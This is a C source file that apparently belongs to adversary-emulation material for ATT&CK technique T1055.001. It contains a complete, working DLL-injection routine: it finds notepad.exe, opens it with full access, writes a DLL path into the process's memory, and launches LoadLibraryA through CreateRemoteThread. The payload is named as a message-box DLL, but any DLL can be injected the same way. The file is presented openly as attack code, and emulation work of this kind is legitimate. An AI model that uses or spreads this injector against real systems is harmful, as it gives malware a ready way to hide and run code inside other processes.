#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>


int FindTarget(const char *procname) {

        HANDLE hSnapshot;
        PROCESSENTRY32 pe32;
        int pid = 0;
                
        hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hSnapshot) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!Process32First(hSnapshot, &pe32)) {
                CloseHandle(hSnapshot);
                return 0;
        }
                
        while (Process32Next(hSnapshot, &pe32)) {
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
                
        CloseHandle(hSnapshot);
                
        return pid;
}

int main(int argc, char *argv[]) {
    
    HANDLE pHandle;
    PVOID pBase;
    PTHREAD_START_ROUTINE pLoadLibrary = NULL;
    char dllPath[ ] = "C:\\Users\\admin\\git\\payloads\\T1055.001\\MessageBoxDLL.dll";
    char target[] = "notepad.exe";
    int pid = 0;

    printf("Injecting %s\n", dllPath);
    
    pid = FindTarget(target);
    if ( pid == 0) {
        printf("Target process not found!\n");
        return -1;
    }

    pLoadLibrary = (PTHREAD_START_ROUTINE) GetProcAddress( GetModuleHandle("Kernel32.dll"), "LoadLibraryA");
    pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)(pid));

    if (pHandle != NULL) {
        pBase = VirtualAllocEx(pHandle, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE);  
    
        WriteProcessMemory(pHandle, pBase, (LPVOID) dllPath, sizeof(dllPath), NULL);

        CreateRemoteThread(pHandle, NULL, 0, pLoadLibrary, pBase, 0, NULL);

        CloseHandle(pHandle); 
    }
    else {
        printf("Error: Cannot open target process.");
        return -2;
    }
}
